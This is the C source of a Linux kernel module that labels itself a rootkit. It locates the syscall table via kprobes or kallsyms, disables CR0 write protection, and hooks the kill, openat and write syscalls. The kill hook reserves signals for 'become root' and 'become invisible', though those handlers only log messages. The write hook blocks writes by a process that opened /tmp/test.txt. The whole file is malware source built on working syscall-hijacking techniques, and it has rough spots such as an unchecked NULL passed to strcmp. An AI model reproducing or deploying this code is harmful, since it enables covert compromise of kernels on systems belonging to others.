/*
 Works for kernel versions >= (4,17,0)
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ftrace.h>
#include <linux/list.h>

// Syscall table address pointer
unsigned long *__sys_call_table_addr;

unsigned int target_fd = 0;
unsigned int target_pid = 0;

enum signals {
    SIGSUPER = 64, // Become root
    SIGINVIS = 63, // Become invisible
};

//LIST_HEAD(hook_list);

// Using kprobes method for getting syscall table address for new versions of kernel
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)

#include <linux/kprobes.h>
#define KPROBE_ 1

static unsigned long lookup_name(const char *name)
{
    struct kprobe kp = {
		.symbol_name = name
	};

    unsigned long ret_value;

    if (register_kprobe(&kp) < 0) return 0;

    ret_value = (unsigned long) kp.addr;
    unregister_kprobe(&kp);

    return ret_value;
}

#else

static unsigned long lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}

#endif

#ifdef KPROBE_

// Defining kprobe for syscall_table (should be replaced with function above)
typedef unsigned long (* kallsyms_lookup_name_t)(const char* name);

static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};

#endif

// Using cr0 register for changing permission of syscall table to rw, for x86 architecture only
#ifdef CONFIG_X86

#include <asm/paravirt.h>
#define PTREGS_MODIF

// For new versions of kernel ptregs_t type serves as a syscall wrapepr
typedef asmlinkage long (*syscall_wrapper)(const struct pt_regs *regs);

static syscall_wrapper orig_kill;
static syscall_wrapper orig_sys_openat;
static syscall_wrapper orig_sys_write;

static inline void write_forced_cr0(unsigned long value)
{
    unsigned long __force_order;

    asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
}

static void unprotect_memory(void)
{
    write_forced_cr0(read_cr0() & ~0x10000);
    pr_info("Unprotected memory\n");
}

static void protect_memory(void)
{
    write_forced_cr0(read_cr0() | 0x10000);
    pr_info("Protected memory\n");
}

#endif

// Modified syscalls
#ifdef PTREGS_MODIF

static asmlinkage long hack_kill_syscall(const struct pt_regs* regs)
{
    int sig = regs->si;

    if (sig == SIGSUPER) {
        printk("Signal 64 was intercepted | became root");
        return 0;
    } else if (sig == SIGINVIS) {
        printk("Signal 63 was intercepted | became invisible");
        return 0;
    }

    return orig_kill(regs);
}

static char *duplicate_filename(const char __user *filename)
{
    char *kernel_filename;

    kernel_filename = kmalloc(4096, GFP_KERNEL);
    if (!kernel_filename) return NULL;

    if (strncpy_from_user(kernel_filename, filename, 4096) < 0) {
        kfree(kernel_filename);
        return NULL;
    }

    return kernel_filename;
}

static asmlinkage long fh_sys_write(struct pt_regs *regs)
{
	long ret;
	struct task_struct *task = current;
    int signum = SIGKILL;

	if (task->pid == target_pid) {
        pr_info("regs->di: %d\n", regs->di);
        pr_info("target_fd: %d\n", target_fd);

		if (regs->di == target_fd) {
            pr_info("No access!!!!\n");

            return -EPERM;
        }

        pr_info("Ta blyat :(\n");
    }

	return orig_sys_write(regs);
}

static asmlinkage long fh_sys_openat(struct pt_regs *regs)
{
	long ret;
	char *kernel_filename;
	struct task_struct *task;
	task = current;

	kernel_filename = duplicate_filename((void*) regs->si);

	if (strcmp(kernel_filename, "/tmp/test.txt") == 0) {
		pr_info("our file is opened by process with id: %d\n", task->pid);
		pr_info("opened file : %s\n", kernel_filename);
		kfree(kernel_filename);
		ret = orig_sys_openat(regs);
		pr_info("fd returned is %ld\n", ret);
		target_fd = ret;
		target_pid = task->pid;
		return ret;
	}

	kfree(kernel_filename);
	ret = orig_sys_openat(regs);

	return ret;
}

#endif

// Working with syscalls

static void store_kill(void)
{
    orig_kill = (syscall_wrapper)__sys_call_table_addr[__NR_kill];
}


static void hook_kill(void)
{
    __sys_call_table_addr[__NR_kill] = (unsigned long)&hack_kill_syscall;
}


static void restore_kill(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_kill] = (unsigned long)orig_kill;
}

static void store_openat(void)
{
    orig_sys_openat = (syscall_wrapper)__sys_call_table_addr[__NR_openat];
}


static void hook_openat(void)
{
    __sys_call_table_addr[__NR_openat] = (unsigned long)&fh_sys_openat;
}


static void restore_openat(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_openat] = (unsigned long)orig_sys_openat;
}

static void store_write(void)
{
    orig_sys_write = (syscall_wrapper)__sys_call_table_addr[__NR_write];
}


static void hook_write(void)
{
    __sys_call_table_addr[__NR_write] = (unsigned long)&fh_sys_write;
}


static void restore_write(void)
{
    /* Restore syscall table */
    __sys_call_table_addr[__NR_write] = (unsigned long)orig_sys_write;
}

// Function that launches when module is inserted
static int __init mod_init(void)
{
    pr_info("rootkit: started\n");

#ifdef KPROBE_

    int ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("[monitor] register_kprobe failed, returned %d\n", ret);
        return ret;
    }

    pr_info("[monitor] kprobe registered. kallsyms_lookup_name found at 0x%px\n",
            kp.addr);

    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    unregister_kprobe(&kp);

#endif

    __sys_call_table_addr = (unsigned long *) kallsyms_lookup_name("sys_call_table");

    store_kill();
    store_openat();
    store_write();
    unprotect_memory();

    hook_kill();
    hook_openat();
    hook_write();
    protect_memory();

    return 0;
}


// Function that launches when module is released
static void __exit mod_exit(void)
{
    pr_info("rootkit: exited\n");

    unprotect_memory();
    restore_kill();
    restore_openat();
    restore_write();
    protect_memory();
}


MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
